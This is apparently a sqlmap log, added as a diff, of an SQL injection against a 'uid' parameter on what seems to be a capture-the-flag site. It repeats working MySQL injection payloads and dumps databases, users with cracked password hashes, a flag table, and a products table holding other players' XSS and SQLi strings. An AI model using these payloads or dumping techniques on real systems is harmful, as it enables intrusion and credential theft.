@@ -1,0 +1,614 @@
+sqlmap identified the following injection point(s) with a total of 129 HTTP(s) requests:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] dbs
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+[3 tables]
++----------+
+| flag     |
+| products |
+| users    |
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] dbs
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: users
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| description | varchar(200) |
+| fname       | varchar(30)  |
+| id          | int(11)      |
+| password    | varchar(33)  |
+| username    | varchar(200) |
++-------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: users
+[9 entries]
++----+-----------+-----------+---------------------------------------------+---------------------------------------+
+| id | fname     | username  | password                                    | description                           |
++----+-----------+-----------+---------------------------------------------+---------------------------------------+
+| 1  | admin     | admin     | 21232f297a57a5a743894a0e4a801fc3 (admin)    | All hail the admin!!                  |
+| 2  | bobby     | bob       | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Sup! I love swimming!                 |
+| 3  | ramesh    | ramesh    | 9aeaed51f2b0f6680c4ed4b07fb1a83c (troll)    | I love 5 star!                        |
+| 4  | suresh    | suresh    | 9aeaed51f2b0f6680c4ed4b07fb1a83c (troll)    | I love 5 star toooo!                  |
+| 5  | alice     | alice     | c93239cae450631e9f55d71aed99e918 (alice1)   | In wonderland right now :O            |
+| 6  | voldemort | voldemort | 856936b417f82c06139c74fa73b1abbe (horcrux)  | How dare you! Avada kedavra!          |
+| 7  | frodo     | frodo     | f0f8820ee817181d9c6852a097d70d8d (frodo)    | Need to go to Mordor. Like right now! |
+| 8  | hodor     | hodor     | a55287e9d0b40429e5a944d10132c93e (hodor)    | Hodor                                 |
+| 65 | rambo     | rhombus   | e52848c0eb863d96bc124737116f23a4 (rhombus)  | Im the rambo!! Bwahahaha!             |
++----+-----------+-----------+---------------------------------------------+---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+[3 tables]
++----------+
+| flag     |
+| products |
+| users    |
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: flag
+[3 columns]
++--------+----------------+
+| Column | Type           |
++--------+----------------+
+| fid    | int(32)        |
+| flag   | varchar(32)    |
+| readme | varchar(50000) |
++--------+----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: flag
+[1 entry]
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+| fid | flag                             | readme                                                                                                                       |
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+| 4   | 43e88d8af39ade74a02a92e4587bd500 | WW91IGNhbid0IGNyYWNoIHRoZSBoYXNoISBhbmQgcGxhaW4gdmFsdWUgaXMgVkFQUiwgeW91IGNhbiB2YWxpZGF0ZSBieSBydW5pbmcgYnJ1dGVmb3JjZSA7KQ== |
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: flag
+[1 entry]
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+| fid | flag                             | readme                                                                                                                       |
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+| 4   | 43e88d8af39ade74a02a92e4587bd500 | WW91IGNhbid0IGNyYWNoIHRoZSBoYXNoISBhbmQgcGxhaW4gdmFsdWUgaXMgVkFQUiwgeW91IGNhbiB2YWxpZGF0ZSBieSBydW5pbmcgYnJ1dGVmb3JjZSA7KQ== |
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: flag
+[1 entry]
++-----+----------------------------------+
+| fid | flag                             |
++-----+----------------------------------+
+| 4   | 43e88d8af39ade74a02a92e4587bd500 |
++-----+----------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: products
+[3 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| description | varchar(250) |
+| name        | char(64)     |
+| secret      | char(64)     |
++-------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: products
+[71 entries]
++------------------------------------------------------------------+-------------------------------------------------------------------------------+-----------------------------------+
+| name                                                             | secret                                                                        | description                       |
++------------------------------------------------------------------+-------------------------------------------------------------------------------+-----------------------------------+
+| facebook                                                         | 3d59f7548e1af2151b64135003ce63c0a484c26b9b8b166a7b1c1805ec34b00a (facebook)   | Awesome! You did it               |
+| messenger                                                        | 3d59f7548e1af2151b64135003ce63c0a484c26b9b8b166a7b1c1805ec34b00a (facebook)   | Darn! So close                    |
+| instagram                                                        | 3d59f7548e1af2151b64135003ce63c0a484c26b9b8b166a7b1c1805ec34b00a (facebook)   | Darn! So close                    |
+| whatsapp                                                         | 3d59f7548e1af2151b64135003ce63c0a484c26b9b8b166a7b1c1805ec34b00a (facebook)   | Darn! So close                    |
+| oculus-rift                                                      | 3d59f7548e1af2151b64135003ce63c0a484c26b9b8b166a7b1c1805ec34b00a (facebook)   | Darn! So close                    |
+| is it a product                                                  | 085a855b550a05ed1a10f1fbb1b2dafbdff098092819f86b3c68c73c9ae03afa              | is is a product                   |
+| twitter                                                          | 5f380a334151c215d524fc63a11faf75ee088df6bdfeb9e74e393088442b8420              | to tweet messages                 |
+| chrome                                                           | 1581c6eb33f0d247bdfebe03cc999dfdafb72ea1b3055588c1d990cd3f4fc000              | web browser                       |
+| Botim                                                            | 0bdc8adbbcd1258e3c8e321c10a537a962342ed667ed2f9c4638e07e777f1668              | to tweet messages                 |
+| faceboo                                                          | 6ed2fbb5d6bbb326aa484c74ff444a856ed53405c17bdf058e978c7e822956c0              | sgfbdfd                           |
+| bookface                                                         | 6ed2fbb5d6bbb326aa484c74ff444a856ed53405c17bdf058e978c7e822956c0              | vrtwbwbdw                         |
+| facebook*                                                        | 6ed2fbb5d6bbb326aa484c74ff444a856ed53405c17bdf058e978c7e822956c0              | sgtstsns                          |
+| face book                                                        | 6ed2fbb5d6bbb326aa484c74ff444a856ed53405c17bdf058e978c7e822956c0              | ajnjvaer                          |
+| facebook + ' '*56 +hack                                          | 6ed2fbb5d6bbb326aa484c74ff444a856ed53405c17bdf058e978c7e822956c0              | aersohper                         |
+| facebook<pre>                                                    | 6ed2fbb5d6bbb326aa484c74ff444a856ed53405c17bdf058e978c7e822956c0              | thkst                             |
+|      facebook                                                    | f4e81e061d8d87718773cb2865437e7f25f19086c389d270681229c611c2870f              | sthryjtrtjjty                     |
+|             facebook                                             | f4e81e061d8d87718773cb2865437e7f25f19086c389d270681229c611c2870f              | dthrthjtjtrrt                     |
+| instagram \xa0                                                   | f4e81e061d8d87718773cb2865437e7f25f19086c389d270681229c611c2870f              | ewjngoeroa[                       |
+| instagram&#162                                                   | f4e81e061d8d87718773cb2865437e7f25f19086c389d270681229c611c2870f              | ewvjoew[oviwnvoe                  |
+| whatsapp               <                                         | 6e44b4f88768314c93c6a511547478db3d99b16d32eb1a35ccc5886e81757db0              | helloZUCC123                      |
+| sha256                                                           | 651f964add5b170e7120518b480db80e9c245e61387a86b4405d5f30e316df76              | to tweet                          |
+| please subscribe                                                 | 34c4d8d99283fafec744589f2e3af0441ceb7f2d0947520e25749c5264b796f7              | join discord                      |
+|     facebook                                                     | 6e44b4f88768314c93c6a511547478db3d99b16d32eb1a35ccc5886e81757db0              | this is a facebook product        |
+| hello                                                            | 2b2e27fe1bdaad12240e7c0513cf1abee86413f5521db849227aa462bb95ec9d              | how are u                         |
+| facebook =                                                       | 6e44b4f88768314c93c6a511547478db3d99b16d32eb1a35ccc5886e81757db0              | Hello Vasundhara                  |
+| faceboook                                                        | 6e44b4f88768314c93c6a511547478db3d99b16d32eb1a35ccc5886e81757db0              | fb product                        |
+| 123                                                              | fc7fe5104b780c66cb52856c32fbd9a58cc1211a2ea6ce56c55a5c1640cd0025              | 123                               |
+| pink                                                             | b4c656c0734500376aa200e609a752ac86890b8428ad78d4bee17439c86d2edf              | lol                               |
+| Lolol                                                            | 6e44b4f88768314c93c6a511547478db3d99b16d32eb1a35ccc5886e81757db0              | Ddnfjdkd                          |
+| LOL                                                              | d2dcf09c98d7a31a3ab47235b7cf682601dceb1b221e0f0f52d640ef7beecc0b              | kvn                               |
+| aaaaaa                                                           | 80c6add9d5e4357179862d6aeb44b07f7aad3a5718681369894719d6df6d0f74              | sdsdsds                           |
+| laptop                                                           | e5e23497a7428a04d962f4c7ea840d1383172404c7b56b73a97efae51c779636              | laptop                            |
+| abhi                                                             | e5e23497a7428a04d962f4c7ea840d1383172404c7b56b73a97efae51c779636              | asdf                              |
+| two                                                              | 2871c0aa2671ad753da3cc38e5b556fb84d4d5fb37cbaf5d5ed6a373244e3f8b              | test                              |
+| facebook ' or 0=0 or '                                           | 6e44b4f88768314c93c6a511547478db3d99b16d32eb1a35ccc5886e81757db0              | lolol                             |
+| jksdvhi;v                                                        | 6e44b4f88768314c93c6a511547478db3d99b16d32eb1a35ccc5886e81757db0              | helloZUCC123                      |
+| messenger1                                                       | 6e44b4f88768314c93c6a511547478db3d99b16d32eb1a35ccc5886e81757db0              | helloZUCC123                      |
+| milk                                                             | ac4f67b1aca43611d1cde73a641ebb134b07bf546ec5d9fb1e1839cf7054f421              | hello                             |
+| <script>document.location.href="hacked.html";</script>           | ac4f67b1aca43611d1cde73a641ebb134b07bf546ec5d9fb1e1839cf7054f421              | hello                             |
+| 'SELECT * FROM information_schema.tables'#                       | ac4f67b1aca43611d1cde73a641ebb134b07bf546ec5d9fb1e1839cf7054f421              | hello                             |
+| admin'#                                                          | ac4f67b1aca43611d1cde73a641ebb134b07bf546ec5d9fb1e1839cf7054f421              | hello                             |
+| SELECT * FROM information_schema.tables\r\n                      | ac4f67b1aca43611d1cde73a641ebb134b07bf546ec5d9fb1e1839cf7054f421              | hi                                |
+| chacha                                                           | 83ee76a15bff6bbfde07a1e5dbfbb3fb622b0aa569cc3865e69e7f9f3de7b189              | chahca                            |
+| Demo                                                             | faacc4b410590f936951f022eba26ffe3b974636d62d37db302512ead6cb2540              | hacked                            |
+| facebook               abc                                       | faacc4b410590f936951f022eba26ffe3b974636d62d37db302512ead6cb2540              | FB                                |
+| facebook            abcd                                         | faacc4b410590f936951f022eba26ffe3b974636d62d37db302512ead6cb2540              | FBD                               |
+| facebook                                                  kaibro | b8abd781d2a9920871a4ccbfbf612ddf308efa800a208d9853e3cbe799f01fa3              | ka1bro8!gGG                       |
+| admin                                                            | b8abd781d2a9920871a4ccbfbf612ddf308efa800a208d9853e3cbe799f01fa3              | admin                             |
+| xxx@xxx.xxx                                                      | 59d2dd14cd44f4e8998791c00d9ce12c3dd43328e0e3c459fec6d4b5f60e8990              | dsadasd                           |
+| facebook                      hi                                 | f77ddc6679c2e2b79397aabf49170e278b7d4511397a514419c50a6b7764232d              | flag                              |
+| Commerce                                                         | 9720faa2d90b6b2738295db056a2ba82ab218b28c633508aac41844eec9f5787              | business                          |
+| fgdsh                                                            | 9e62065d5d3c1f2cb2e23d71440e37153b0f0772e5fa7b3132b226a104b3360e (Asdfghjkl1) | fhgdhd g hh ds  hrthd g           |
+| facebook      nice                                               | 3e70b949fa539ab1244fdc67168796541c0e0d8db9e928924952fe4de0751112 (Qwerty1234) | 1                                 |
+| anjana                                                           | 79126d87d889bcaaa22cf260ff24e8431d5182ca2677a83e601f1e404e4484a3              | loosu                             |
+| zoho                                                             | 4bb62dd7fdd2fa6f576cdf195adf059a1fe302a7f282e0e6288a3c5c520e5b38              | adsggh<script>alert("1")</script> |
+| zo                                                               | 3366dea7702d21140df557d25d8c4c93fec3a64f7ff90e8aaf449c11602d0068              | adsggh<script>alert("1")</script> |
+| Ad                                                               | 3571514816b181e98efdc612facc93a4363c167b4fa0161a7d9f39e826b30a6c              | seffff                            |
+| Asd                                                              | 442dfb572cf7b2983913baf4c881b5f7ddbc4950ad29102cc691c0443b6b6122              | d                                 |
+| S                                                                | daab29878bb8c86c0abada8b7426f8367973953d48d5aa8c43a27fae6dbe52c4              | gdfbjb                            |
+|  facebook                                                        | 6d21e744505050ed78a257fa787b09613ee77a7ca07db6e18f4d7d1a190f9d7a              | Hithereitsme10                    |
+|   facebook                                                       | 6d21e744505050ed78a257fa787b09613ee77a7ca07db6e18f4d7d1a190f9d7a              | Hithereitsme10                    |
+|  instagram                                                       | 6d21e744505050ed78a257fa787b09613ee77a7ca07db6e18f4d7d1a190f9d7a              | Hithereitsme10                    |
+|  messenger                                                       | 6d21e744505050ed78a257fa787b09613ee77a7ca07db6e18f4d7d1a190f9d7a              | Hithereitsme10                    |
+|  whatsapp                                                        | 6d21e744505050ed78a257fa787b09613ee77a7ca07db6e18f4d7d1a190f9d7a              | Hithereitsme10                    |
+|  oculus-rift                                                     | 6d21e744505050ed78a257fa787b09613ee77a7ca07db6e18f4d7d1a190f9d7a              | Hithereitsme10                    |
+| ks                                                               | 98c8fdc620aa92c67dd773818371308723cb9af21cf62015c71b51ca3ca33218              | kjsogfj                           |
+| sd                                                               | a782b1ea26814ddbbd299ad023031727893960259e27b58a1fb9a58c415c22ef              | jhjhj                             |
+| facebook                   kaibro                                | c1ffa4a3014b10629a032d3f957e265e3c2f5507764e913f042bcb272f492a7c              | loosu                             |
+| jhj                                                              | 1a335ed7e3af866d07480b1d6a8f16363a3e551dca3879d23856dccf3fd1f891              | hiuh                              |
+| pudiveekshita                                                    | 1448fb993ae020410a1be12864d7f313c49d2b19706a81dcafbf317ab1069386              | Bhavana                           |
+| Pudi Veekshita                                                   | fa9ecd99272417468e6ad6fc02f5ed206ab880d05fe9f499710d9b6318a3809e              | join in the facebook              |
++------------------------------------------------------------------+-------------------------------------------------------------------------------+-----------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
